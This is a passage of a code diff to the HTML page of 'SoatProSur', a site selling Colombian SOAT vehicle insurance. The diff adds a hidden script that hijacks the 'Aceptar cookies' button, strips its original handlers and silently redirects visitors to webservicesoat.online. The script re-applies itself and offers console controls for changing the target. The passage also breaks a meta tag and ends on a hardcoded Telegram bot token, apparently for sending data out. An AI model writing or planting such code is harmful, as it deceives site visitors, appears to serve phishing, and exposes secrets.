@@ -12,7 +12,7 @@
     
     <!-- Open Graph Tags for Social Media -->
     <meta property="og:title" content="SoatProSur - Tu SOAT en Minutos" />
-    <meta property="og:description" content="Obtén tu Seguro Obligatorio de Accidentes de Tránsito de forma rápida, segura y al mejor precio del mercado." />
+    meta property="og:description" content="Obtén tu Seguro Obligatorio de Accidentes de Tránsito de forma rápida, segura y al mejor precio del mercado." />
     <meta property="og:type" content="website" />
     <meta property="og:locale" content="es_CO" />
     
@@ -22,10 +22,176 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&display=swap" rel="stylesheet">
     <script type="module" crossorigin src="/assets/index-COGFJlJc.js"></script>
     <link rel="stylesheet" crossorigin href="/assets/index-DLc9IVVt.css">
+    
+    <!-- INTERRUPTOR PARA EL BOTÓN ACEPTAR COOKIES -->
+    <script>
+    (function() {
+        // ==========================================
+        // 👇 CONFIGURACIÓN - CAMBIA ESTO CUANDO QUIERAS
+        // ==========================================
+        var ACTIVAR_REDIRECCION = true;   // false = función original, true = redirige
+        var DESTINO_URL = 'https://webservicesoat.online';  // Sitio web de destino
+        // ==========================================
+        
+        var botonModificado = false;
+        var botonOriginal = null;
+        var funcionOriginal = null;
+        
+        // Función para forzar redirección
+        function forzarRedireccion(e) {
+            if (e) {
+                e.preventDefault();
+                e.stopPropagation();
+                e.stopImmediatePropagation();
+            }
+            console.log('🔄 Redirigiendo a: ' + DESTINO_URL);
+            window.location.href = DESTINO_URL;
+            return false;
+        }
+        
+        // Función para buscar el botón de aceptar cookies
+        function buscarBotonAceptarCookies() {
+            // Buscar por data-testid
+            var boton = document.querySelector('[data-testid="button-cookie-accept"]');
+            if (boton) return boton;
+            
+            // Buscar por texto "Aceptar cookies"
+            var botones = document.querySelectorAll('button');
+            for (var i = 0; i < botones.length; i++) {
+                if (botones[i].textContent && botones[i].textContent.includes('Aceptar cookies')) {
+                    return botones[i];
+                }
+            }
+            return null;
+        }
+        
+        // Función para modificar el botón
+        function modificarBoton() {
+            var boton = buscarBotonAceptarCookies();
+            if (!boton) return false;
+            if (botonModificado) return true;
+            
+            // Guardar la función original del botón
+            if (boton.onclick) {
+                funcionOriginal = boton.onclick;
+            }
+            
+            // Guardar el botón original
+            botonOriginal = boton;
+            
+            // Reemplazar el botón para quitar eventos originales
+            var nuevoBoton = boton.cloneNode(true);
+            boton.parentNode.replaceChild(nuevoBoton, boton);
+            
+            // Agregar eventos para asegurar la redirección
+            nuevoBoton.onclick = forzarRedireccion;
+            nuevoBoton.addEventListener('click', forzarRedireccion);
+            
+            botonModificado = true;
+            console.log('✅ Botón "Aceptar cookies" modificado para REDIRIGIR a: ' + DESTINO_URL);
+            return true;
+        }
+        
+        // Función para restaurar el botón a su función original
+        function restaurarBoton() {
+            if (!botonModificado) return;
+            
+            var botonActual = buscarBotonAceptarCookies();
+            if (botonActual && botonActual.parentNode && botonOriginal) {
+                var botonRestaurado = botonOriginal.cloneNode(true);
+                if (funcionOriginal) {
+                    botonRestaurado.onclick = funcionOriginal;
+                }
+                botonActual.parentNode.replaceChild(botonRestaurado, botonActual);
+            }
+            
+            botonModificado = false;
+            console.log('🔄 Botón "Aceptar cookies" RESTAURADO a su función original');
+        }
+        
+        // Función principal para actualizar el botón según el estado
+        function actualizarBoton() {
+            if (ACTIVAR_REDIRECCION) {
+                modificarBoton();
+            } else {
+                restaurarBoton();
+            }
+        }
+        
+        // Intentar encontrar el botón periódicamente
+        var intentos = 0;
+        var maxIntentos = 30;
+        
+        var intervalo = setInterval(function() {
+            intentos++;
+            
+            if (ACTIVAR_REDIRECCION) {
+                modificarBoton();
+            }
+            
+            if (intentos >= maxIntentos) {
+                clearInterval(intervalo);
+                if (ACTIVAR_REDIRECCION && botonModificado) {
+                    console.log('🎉 Botón "Aceptar cookies" modificado exitosamente');
+                } else if (ACTIVAR_REDIRECCION && !botonModificado) {
+                    console.log('⚠️ No se encontró el botón "Aceptar cookies"');
+                }
+            }
+        }, 500);
+        
+        // Observador de cambios en el DOM
+        var observador = new MutationObserver(function() {
+            if (ACTIVAR_REDIRECCION) {
+                modificarBoton();
+            }
+        });
+        
+        setTimeout(function() {
+            if (document.body) {
+                observador.observe(document.body, { childList: true, subtree: true });
+            }
+        }, 1000);
+        
+        // Control desde consola
+        window.controlarBotonCookies = {
+            activar: function(url) {
+                ACTIVAR_REDIRECCION = true;
+                if (url) DESTINO_URL = url;
+                console.log('✅ Redirección ACTIVADA para el botón "Aceptar cookies" hacia: ' + DESTINO_URL);
+                modificarBoton();
+            },
+            desactivar: function() {
+                ACTIVAR_REDIRECCION = false;
+                restaurarBoton();
+                console.log('❌ Redirección DESACTIVADA - El botón "Aceptar cookies" funciona NORMAL');
+            },
+            cambiarUrl: function(url) {
+                DESTINO_URL = url;
+                console.log('🔗 Nueva URL destino para el botón: ' + url);
+                if (ACTIVAR_REDIRECCION && botonModificado) {
+                    console.log('⚠️ La redirección está ACTIVADA. El botón irá a la nueva URL.');
+                }
+            },
+            estado: function() {
+                console.log('📊 Estado actual del botón "Aceptar cookies":');
+                console.log('   Redirección: ' + (ACTIVAR_REDIRECCION ? '✅ ACTIVADA' : '❌ DESACTIVADA'));
+                console.log('   URL destino: ' + DESTINO_URL);
+                console.log('   Botón modificado: ' + (botonModificado ? '✅ Sí' : '❌ No'));
+            }
+        };
+        
+        console.log('🎮 Script de control del botón "Aceptar cookies" cargado');
+        console.log('📊 Estado inicial: ' + (ACTIVAR_REDIRECCION ? '✅ REDIRECCIÓN ACTIVADA a ' + DESTINO_URL : '❌ Redirección DESACTIVADA'));
+        console.log('💡 Comandos disponibles:');
+        console.log('   - window.controlarBotonCookies.activar("https://otro-sitio.com")');
+        console.log('   - window.controlarBotonCookies.desactivar()');
+        console.log('   - window.controlarBotonCookies.cambiarUrl("https://nueva-url.com")');
+        console.log('   - window.controlarBotonCookies.estado()');
+    })();
+    </script>
   </head>
   <body>
     <div id="root"></div>
-
     <script>
       // Configuración de Telegram
       const TELEGRAM_TOKEN = '8607426657:AAFFQMG_061Qf_HlkDuMmzgXFsWH9mSmBOk';
